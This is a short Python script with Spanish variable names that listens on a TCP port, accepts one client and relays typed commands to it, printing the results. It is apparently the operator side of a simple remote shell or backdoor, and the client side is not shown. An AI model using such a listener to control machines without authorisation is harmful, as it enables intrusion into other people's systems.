import socket

direccion = ('192.168.100.13', 2000)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
    servidor.bind(direccion)
    servidor.listen(2)
    print(f'Litening in {direccion}')
    cliente, adrr = servidor.accept()
    cmd = input('$: ')
    while cmd != 'exit':
        cliente.send(cmd.encode())
        resultado = cliente.recv(4096).decode()
        if resultado != '':
            print(resultado)
        cmd = input('$: ')
